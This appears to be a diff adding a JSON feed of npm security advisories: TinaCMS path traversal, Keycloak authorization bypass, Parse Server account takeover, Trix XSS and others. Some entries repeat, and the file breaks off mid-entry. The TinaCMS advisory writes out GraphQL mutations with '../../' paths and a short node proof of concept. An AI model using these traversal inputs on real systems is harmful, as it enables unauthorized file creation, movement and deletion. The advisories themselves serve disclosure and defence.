@@ -1,0 +1,663 @@
+{
+  "schema_version": "1.2.0",
+  "generated_at": "2026-03-12T19:10:09Z",
+  "source_id": "npm_security_advisories",
+  "hash": "sha256:b194d01f9aedaf7ec4ef6b7c2a535f0e004590144751e8aab8a8adb6b0eedadf",
+  "prev_hash": "sha256:e3bb609c52e539cddd538abe04ebc5f9ecfa7ee909bc697b08f2eeb8564a0762",
+  "cursor": "sha256:a33df3b9bef75ee14a787ead3d429da2ec94af119ab17ceec66d29b66a3d1435",
+  "prev_cursor": "sha256:65ed1c0431cf7792ba6a2f740b579b5bcaf40fbcc94a098a183c8e64416047ba",
+  "changed": true,
+  "ttl_sec": 1800,
+  "sources_included": [
+    "npm_security_advisories"
+  ],
+  "batch_narrative": "npm_security_advisories: 20 advisories (3 low).",
+  "buckets": {
+    "items": [
+      {
+        "source": "npm_security_advisories",
+        "id": "8128d0f6acab26ba037324a27f741ba3",
+        "url": "https://github.com/advisories/GHSA-2238-xc5r-v9hj",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@tinacms/graphql] @tinacms/graphql has a Path Traversal issue",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-2238-xc5r-v9hj"
+          ],
+          "content_hash": "sha256:aff10a9d06a6feaa77ee432707029c809a991b38f6bb7f6f593adee5b2b78901"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"description\">Description</h3>\n<p>TinaCMS allows users to create, update, and delete content documents using relative file paths (<code>relativePath</code>, <code>newRelativePath</code>) via GraphQL mutations. Under certain conditions, these paths are combined with the collection path using <code>path.join()</code> without validating that the resolved path remains within the collection root directory.</p>\n<p>Because <code>path.join()</code> does not prevent directory traversal, paths containing <code>../</code> sequences can escape the intended directory boundary.</p>\n<h3 id=\"attack-vectors\">Attack Vectors</h3>\n<ol>\n<li><p><strong>File Creation</strong>: Create files outside the collection directory</p>\n<pre><code class=\"language-graphql\">createDocument(\n  collection: \"post\"\n  relativePath: \"../../config/malicious.md\"\n  params: { post: { title: \"malicious\" } }\n)\n</code></pre>\n</li>\n<li><p><strong>File Move/Rename</strong>: Move existing files outside the collection</p>\n<pre><code class=\"language-graphql\">updateDocument(\n  collection: \"post\"\n  relativePath: \"existing.md\"\n  params: { relativePath: \"../../stolen.md\" }\n)\n</code></pre>\n</li>\n<li><p><strong>File Deletion</strong>: Delete files outside the collection</p>\n<pre><code class=\"language-graphql\">deleteDocument(\n  collection: \"post\"\n  relativePath: \"../../important-config.md\"\n)\n</code></pre>\n</li>\n<li><p><strong>Folder Creation</strong>: Create folders outside the collection</p>\n<pre><code class=\"language-graphql\">createFolder(\n  collection: \"post\"\n  relativePath: \"../../malicious-folder\"\n)\n</code></pre>\n</li>\n</ol>\n<h2 id=\"impact\">Impact</h2>\n<p>An authenticated user with document mutation permissions can:</p>\n<ul>\n<li><strong>Create content files</strong> outside collection boundaries (subject to schema validation)</li>\n<li><strong>Move or rename files</strong> outside collection boundaries</li>\n<li><strong>Delete content files</strong> outside collection boundaries</li>\n<li><strong>Read file contents</strong> via document retrieval mutations</li>\n</ul>\n<h2 id=\"mitigating-factors\">Mitigating Factors</h2>\n<p>Several constraints limit the practical impact of this vulnerability:</p>\n<ol>\n<li><p><strong>Schema Validation</strong>: Created/updated content must conform to the collection's GraphQL schema. Attackers cannot write arbitrary file content—the <code>params</code> argument is validated against the generated mutation types (e.g., <code>PostMutation</code>).</p>\n</li>\n<li><p><strong>Authentication Required</strong>: Exploitation requires authenticated access with CMS editor permissions. Anonymous users cannot access GraphQL mutations.</p>\n</li>\n<li><p><strong>Git Tracking</strong>: In typical deployments, all file operations are tracked in git (either via GitHub API for Tina Cloud/self-hosted with GitProvider, or local filesystem changes). Malicious changes are visible in version control and can be reverted.</p>\n</li>\n</ol>\n<h3 id=\"what-this-vulnerability-does-not-allow\">What This Vulnerability Does NOT Allow</h3>\n<ul>\n<li>Writing arbitrary file content (content is schema-validated)</li>\n<li>Silent/untracked file modifications (changes appear in git)</li>\n<li>Unauthenticated access</li>\n</ul>\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n<p>See <code>packages/@tinacms/graphql/tests/path-traversal-security/index.test.ts</code> for automated tests demonstrating the vulnerability.</p>\n<p>Manual reproduction:</p>\n<pre><code class=\"language-bash\">node -e \"\nconst path = require('path');\n\nconst collectionPath = 'content/posts';\nconst maliciousRelativePath = '../../OUTSIDE/poc.md';\n\nconst realPath = path.join(collectionPath, maliciousRelativePath);\nconsole.log('Resolved path:', realPath);\n// Output: OUTSIDE/poc.md (escaped content/posts)\n\"\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tinacms/tinacms/security/advisories/GHSA-2238-xc5r-v9hj\">https://github.com/tinacms/tinacms/security/advisories/GHSA-2238-xc5r-v9hj</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2238-xc5r-v9hj\">https://github.com/advisories/GHSA-2238-xc5r-v9hj</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T17:50:29.000Z",
+          "date_published": "2026-03-12T17:50:28.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-2238-xc5r-v9hj"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "347db962ca722f55ffc29b77927c9d88",
+        "url": "https://github.com/advisories/GHSA-r8jr-wg88-fq5c",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@keycloak/keycloak-admin-client] Keycloak vulnerable to authorization bypass via the Admin API",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-r8jr-wg88-fq5c"
+          ],
+          "content_hash": "sha256:3082e951610397c429198055a965b0ba455dae099659625d9d45e996fc590cd0"
+        },
+        "source_payload": {
+          "content_html": "<p>A flaw was found in Keycloak. An authorization bypass vulnerability in the Keycloak Admin API allows any authenticated user, even those without administrative privileges, to enumerate the organization memberships of other users. This information disclosure occurs if the attacker knows the victim's unique identifier (UUID) and the Organizations feature is enabled.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-2366\">https://nvd.nist.gov/vuln/detail/CVE-2026-2366</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2026-2366\">https://access.redhat.com/security/cve/CVE-2026-2366</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2439081\">https://bugzilla.redhat.com/show_bug.cgi?id=2439081</a></li>\n<li><a href=\"https://github.com/keycloak/keycloak/issues/47062\">https://github.com/keycloak/keycloak/issues/47062</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r8jr-wg88-fq5c\">https://github.com/advisories/GHSA-r8jr-wg88-fq5c</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T17:38:29.000Z",
+          "date_published": "2026-03-12T12:30:29.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-r8jr-wg88-fq5c"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "1f1769bd3546d694f6967368269a6479",
+        "url": "https://github.com/advisories/GHSA-xj37-qjg2-xwv2",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@whyour/qinglong] @whyour/qinglong: manipulation of the argument command leads to protection mechanism failure",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-xj37-qjg2-xwv2"
+          ],
+          "content_hash": "sha256:75d8dfd767434391b10f109165532c439a3f0c905065b7e2159f1f096c57930f"
+        },
+        "source_payload": {
+          "content_html": "<p>A security vulnerability has been detected in whyour qinglong up to 2.20.1. Affected is an unknown function of the file back/loaders/express.ts of the component API Interface. The manipulation of the argument command leads to protection mechanism failure. The attack may be initiated remotely. The exploit has been disclosed publicly and may be used. Upgrading to version 2.20.2 is able to address this issue. The identifier of the patch is 6bec52dca158481258315ba0fc2f11206df7b719. It is advisable to upgrade the affected component. The code maintainer was informed beforehand about the issues. He reacted very fast and highly professional.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-3965\">https://nvd.nist.gov/vuln/detail/CVE-2026-3965</a></li>\n<li><a href=\"https://github.com/A7cc/cve/issues/6\">https://github.com/A7cc/cve/issues/6</a></li>\n<li><a href=\"https://github.com/A7cc/cve/issues/6#issue-3999235307\">https://github.com/A7cc/cve/issues/6#issue-3999235307</a></li>\n<li><a href=\"https://github.com/whyour/qinglong/pull/2941\">https://github.com/whyour/qinglong/pull/2941</a></li>\n<li><a href=\"https://github.com/whyour/qinglong/commit/6bec52dca158481258315ba0fc2f11206df7b719\">https://github.com/whyour/qinglong/commit/6bec52dca158481258315ba0fc2f11206df7b719</a></li>\n<li><a href=\"https://github.com/whyour/qinglong\">https://github.com/whyour/qinglong</a></li>\n<li><a href=\"https://github.com/whyour/qinglong/releases/tag/v2.20.2\">https://github.com/whyour/qinglong/releases/tag/v2.20.2</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.350394\">https://vuldb.com/?ctiid.350394</a></li>\n<li><a href=\"https://vuldb.com/?id.350394\">https://vuldb.com/?id.350394</a></li>\n<li><a href=\"https://vuldb.com/?submit.768861\">https://vuldb.com/?submit.768861</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xj37-qjg2-xwv2\">https://github.com/advisories/GHSA-xj37-qjg2-xwv2</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T17:34:39.000Z",
+          "date_published": "2026-03-12T00:31:17.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-xj37-qjg2-xwv2"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "6e5294cc2ab1db82a7dbfd1084bcb72b",
+        "url": "https://github.com/advisories/GHSA-xjj9-2w6f-jg55",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[openclaw]  Duplicate Advisory: OpenClaw safeBins file-existence oracle information disclosure",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-xjj9-2w6f-jg55"
+          ],
+          "content_hash": "sha256:86985a504b83389564585eeecac840435ad4f37187b424092a0d55de5eb0366d"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"duplicate-advisory\">Duplicate Advisory</h3>\n<p>This advisory has been withdrawn because it is a duplicate of [OTHER GHSA-ID]. This link is maintained to preserve external references.</p>\n<h3 id=\"original-description\">Original Description</h3>\n<p>A vulnerability was identified in OpenClaw up to 2026.2.17. This issue affects the function tools.exec.safeBins of the component File Existence Handler. The manipulation leads to information exposure through discrepancy. The attack needs to be performed locally. Upgrading to version 2026.2.19-beta.1 is capable of addressing this issue. The identifier of the patch is bafdbb6f112409a65decd3d4e7350fbd637c7754. Upgrading the affected component is advised.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openclaw/openclaw/security/advisories/GHSA-6c9j-x93c-rw6j\">https://github.com/openclaw/openclaw/security/advisories/GHSA-6c9j-x93c-rw6j</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-4040\">https://nvd.nist.gov/vuln/detail/CVE-2026-4040</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw/commit/bafdbb6f112409a65decd3d4e7350fbd637c7754\">https://github.com/openclaw/openclaw/commit/bafdbb6f112409a65decd3d4e7350fbd637c7754</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw\">https://github.com/openclaw/openclaw</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw/releases/tag/v2026.2.19-beta.1\">https://github.com/openclaw/openclaw/releases/tag/v2026.2.19-beta.1</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.350652\">https://vuldb.com/?ctiid.350652</a></li>\n<li><a href=\"https://vuldb.com/?id.350652\">https://vuldb.com/?id.350652</a></li>\n<li><a href=\"https://vuldb.com/?submit.769581\">https://vuldb.com/?submit.769581</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xjj9-2w6f-jg55\">https://github.com/advisories/GHSA-xjj9-2w6f-jg55</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T17:30:19.000Z",
+          "date_published": "2026-03-12T12:30:29.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-xjj9-2w6f-jg55"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "0ef7cc3fba5289591a1a0faa041c3d62",
+        "url": "https://github.com/advisories/GHSA-wgx8-r9vw-2w4h",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[openclaw]  Duplicate Advisory: OpenClaw: Skill env override host env injection via applySkillConfigEnvOverrides (defense-in-depth)",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-wgx8-r9vw-2w4h"
+          ],
+          "content_hash": "sha256:b21f4aafeb5d2cecd8d19cb9059244fdc89db655ed1df249e286ef6cfdfcd11a"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"duplicate-advisory\">Duplicate Advisory</h3>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-82g8-464f-2mv7. This link is maintained to preserve external references.</p>\n<h3 id=\"original-description\">Original Description</h3>\n<p>A vulnerability was determined in OpenClaw 2026.2.19-2. This vulnerability affects the function applySkillConfigenvOverrides of the component Skill Env Handler. Executing a manipulation can lead to code injection. It is possible to launch the attack remotely. Upgrading to version 2026.2.21-beta.1 is able to resolve this issue. This patch is called 8c9f35cdb51692b650ddf05b259ccdd75cc9a83c. It is recommended to upgrade the affected component.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openclaw/openclaw/security/advisories/GHSA-82g8-464f-2mv7\">https://github.com/openclaw/openclaw/security/advisories/GHSA-82g8-464f-2mv7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-4039\">https://nvd.nist.gov/vuln/detail/CVE-2026-4039</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw/commit/8c9f35cdb51692b650ddf05b259ccdd75cc9a83c\">https://github.com/openclaw/openclaw/commit/8c9f35cdb51692b650ddf05b259ccdd75cc9a83c</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw\">https://github.com/openclaw/openclaw</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw/releases/tag/v2026.2.21-beta.1\">https://github.com/openclaw/openclaw/releases/tag/v2026.2.21-beta.1</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.350651\">https://vuldb.com/?ctiid.350651</a></li>\n<li><a href=\"https://vuldb.com/?id.350651\">https://vuldb.com/?id.350651</a></li>\n<li><a href=\"https://vuldb.com/?submit.769580\">https://vuldb.com/?submit.769580</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wgx8-r9vw-2w4h\">https://github.com/advisories/GHSA-wgx8-r9vw-2w4h</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T17:30:15.000Z",
+          "date_published": "2026-03-12T12:30:29.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-wgx8-r9vw-2w4h"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "53d58d9d553ff224d7290b6c47db10da",
+        "url": "https://github.com/advisories/GHSA-5fw2-8jcv-xh87",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[parse-server] Parse Server: Account takeover via operator injection in authentication data identifier",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-5fw2-8jcv-xh87"
+          ],
+          "content_hash": "sha256:a4f5495eecc5568d605dabaed65262d83196cab4e995d29bce1cf21d597f4cc1"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An unauthenticated attacker can take over any user account that was created with an authentication provider that does not validate the format of the user identifier (e.g. anonymous authentication). By sending a crafted login request, the attacker can cause the server to perform a pattern-matching query instead of an exact-match lookup, allowing the attacker to match an existing user and obtain a valid session token for that user's account. Both MongoDB and PostgreSQL database backends are affected. Any Parse Server deployment that allows anonymous authentication (enabled by default) is vulnerable.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The fix enforces that the user identifier in authentication data is a string before using it in a database query. Non-string values are rejected with a validation error.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no known workaround.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>GitHub security advisory: <a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-5fw2-8jcv-xh87\">https://github.com/parse-community/parse-server/security/advisories/GHSA-5fw2-8jcv-xh87</a></li>\n<li>Fix Parse Server 9: <a href=\"https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.12\">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.12</a></li>\n<li>Fix Parse Server 8: <a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.38\">https://github.com/parse-community/parse-server/releases/tag/8.6.38</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-5fw2-8jcv-xh87\">https://github.com/parse-community/parse-server/security/advisories/GHSA-5fw2-8jcv-xh87</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.38\">https://github.com/parse-community/parse-server/releases/tag/8.6.38</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.12\">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.12</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5fw2-8jcv-xh87\">https://github.com/advisories/GHSA-5fw2-8jcv-xh87</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T17:29:58.000Z",
+          "date_published": "2026-03-12T17:29:55.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-5fw2-8jcv-xh87"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "53d58d9d553ff224d7290b6c47db10da",
+        "url": "https://github.com/advisories/GHSA-5fw2-8jcv-xh87",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[parse-server] Parse Server: Account takeover via operator injection in authentication data identifier",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-5fw2-8jcv-xh87"
+          ],
+          "content_hash": "sha256:a4f5495eecc5568d605dabaed65262d83196cab4e995d29bce1cf21d597f4cc1"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An unauthenticated attacker can take over any user account that was created with an authentication provider that does not validate the format of the user identifier (e.g. anonymous authentication). By sending a crafted login request, the attacker can cause the server to perform a pattern-matching query instead of an exact-match lookup, allowing the attacker to match an existing user and obtain a valid session token for that user's account. Both MongoDB and PostgreSQL database backends are affected. Any Parse Server deployment that allows anonymous authentication (enabled by default) is vulnerable.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The fix enforces that the user identifier in authentication data is a string before using it in a database query. Non-string values are rejected with a validation error.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no known workaround.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>GitHub security advisory: <a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-5fw2-8jcv-xh87\">https://github.com/parse-community/parse-server/security/advisories/GHSA-5fw2-8jcv-xh87</a></li>\n<li>Fix Parse Server 9: <a href=\"https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.12\">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.12</a></li>\n<li>Fix Parse Server 8: <a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.38\">https://github.com/parse-community/parse-server/releases/tag/8.6.38</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-5fw2-8jcv-xh87\">https://github.com/parse-community/parse-server/security/advisories/GHSA-5fw2-8jcv-xh87</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.38\">https://github.com/parse-community/parse-server/releases/tag/8.6.38</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.12\">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.12</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5fw2-8jcv-xh87\">https://github.com/advisories/GHSA-5fw2-8jcv-xh87</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T17:29:58.000Z",
+          "date_published": "2026-03-12T17:29:55.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-5fw2-8jcv-xh87"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "1e7a21b5de3d793b659078dc3e9242e9",
+        "url": "https://github.com/advisories/GHSA-2cjm-2gwv-m892",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[parse-server] Parse Server's OAuth2 adapter shares mutable state across providers via singleton instance",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-2cjm-2gwv-m892"
+          ],
+          "content_hash": "sha256:1d4832fc62305b0b8871b85c0451d72226f148a1d0bc2d92744cc641cbcd3e42"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Parse Server's built-in OAuth2 auth adapter exports a singleton instance that is reused directly across all OAuth2 provider configurations. Under concurrent authentication requests for different OAuth2 providers, one provider's token validation may execute using another provider's configuration, potentially allowing a token that should be rejected by one provider to be accepted because it is validated against a different provider's policy.</p>\n<p>Deployments that configure multiple OAuth2 providers via the <code>oauth2: true</code> flag are affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The fix ensures that a new adapter instance is created for each provider instead of reusing the singleton, so each provider's configuration is isolated.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no known workaround. If only a single OAuth2 provider is configured, the race condition cannot occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>GitHub security advisory: <a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-2cjm-2gwv-m892\">https://github.com/parse-community/parse-server/security/advisories/GHSA-2cjm-2gwv-m892</a></li>\n<li>Fix Parse Server 9: <a href=\"https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.11\">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.11</a></li>\n<li>Fix Parse Server 8: <a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.37\">https://github.com/parse-community/parse-server/releases/tag/8.6.37</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-2cjm-2gwv-m892\">https://github.com/parse-community/parse-server/security/advisories/GHSA-2cjm-2gwv-m892</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.37\">https://github.com/parse-community/parse-server/releases/tag/8.6.37</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.11\">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2cjm-2gwv-m892\">https://github.com/advisories/GHSA-2cjm-2gwv-m892</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T17:29:50.000Z",
+          "date_published": "2026-03-12T17:29:49.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-2cjm-2gwv-m892"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "1e7a21b5de3d793b659078dc3e9242e9",
+        "url": "https://github.com/advisories/GHSA-2cjm-2gwv-m892",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[parse-server] Parse Server's OAuth2 adapter shares mutable state across providers via singleton instance",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-2cjm-2gwv-m892"
+          ],
+          "content_hash": "sha256:1d4832fc62305b0b8871b85c0451d72226f148a1d0bc2d92744cc641cbcd3e42"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Parse Server's built-in OAuth2 auth adapter exports a singleton instance that is reused directly across all OAuth2 provider configurations. Under concurrent authentication requests for different OAuth2 providers, one provider's token validation may execute using another provider's configuration, potentially allowing a token that should be rejected by one provider to be accepted because it is validated against a different provider's policy.</p>\n<p>Deployments that configure multiple OAuth2 providers via the <code>oauth2: true</code> flag are affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The fix ensures that a new adapter instance is created for each provider instead of reusing the singleton, so each provider's configuration is isolated.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no known workaround. If only a single OAuth2 provider is configured, the race condition cannot occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>GitHub security advisory: <a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-2cjm-2gwv-m892\">https://github.com/parse-community/parse-server/security/advisories/GHSA-2cjm-2gwv-m892</a></li>\n<li>Fix Parse Server 9: <a href=\"https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.11\">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.11</a></li>\n<li>Fix Parse Server 8: <a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.37\">https://github.com/parse-community/parse-server/releases/tag/8.6.37</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-2cjm-2gwv-m892\">https://github.com/parse-community/parse-server/security/advisories/GHSA-2cjm-2gwv-m892</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.37\">https://github.com/parse-community/parse-server/releases/tag/8.6.37</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.11\">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2cjm-2gwv-m892\">https://github.com/advisories/GHSA-2cjm-2gwv-m892</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T17:29:50.000Z",
+          "date_published": "2026-03-12T17:29:49.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-2cjm-2gwv-m892"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "8d2ff81afd67d0c4818f382aca94c992",
+        "url": "https://github.com/advisories/GHSA-qmpg-8xg6-ph5q",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[trix] Trix has a Stored XSS vulnerability through serialized attributes",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-qmpg-8xg6-ph5q"
+          ],
+          "content_hash": "sha256:84475d0216bcbe4041b4ccb9debf3553c830bb7f8c8768c694fd0638eda84236"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Trix editor, in versions prior to 2.1.17, is vulnerable to XSS attacks when a <code>data-trix-serialized-attributes</code> attribute bypasses the DOMPurify sanitizer.</p>\n<p>An attacker could craft HTML containing a <code>data-trix-serialized-attributes</code> attribute with a malicious payload that, when the content is rendered, could execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Update Recommendation: Users should upgrade to Trix editor version 2.1.17 or later.</p>\n<h3 id=\"references\">References</h3>\n<p>The XSS vulnerability was responsibly reported by Hackerone researcher <a href=\"https://hackerone.com/newbiefromcoma\">newbiefromcoma</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/basecamp/trix/security/advisories/GHSA-qmpg-8xg6-ph5q\">https://github.com/basecamp/trix/security/advisories/GHSA-qmpg-8xg6-ph5q</a></li>\n<li><a href=\"https://github.com/basecamp/trix/pull/1282\">https://github.com/basecamp/trix/pull/1282</a></li>\n<li><a href=\"https://github.com/basecamp/trix/commit/53197ab5a142e6b0b76127cb790726b274eaf1bc\">https://github.com/basecamp/trix/commit/53197ab5a142e6b0b76127cb790726b274eaf1bc</a></li>\n<li><a href=\"https://github.com/basecamp/trix/releases/tag/v2.1.17\">https://github.com/basecamp/trix/releases/tag/v2.1.17</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qmpg-8xg6-ph5q\">https://github.com/advisories/GHSA-qmpg-8xg6-ph5q</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T17:29:33.000Z",
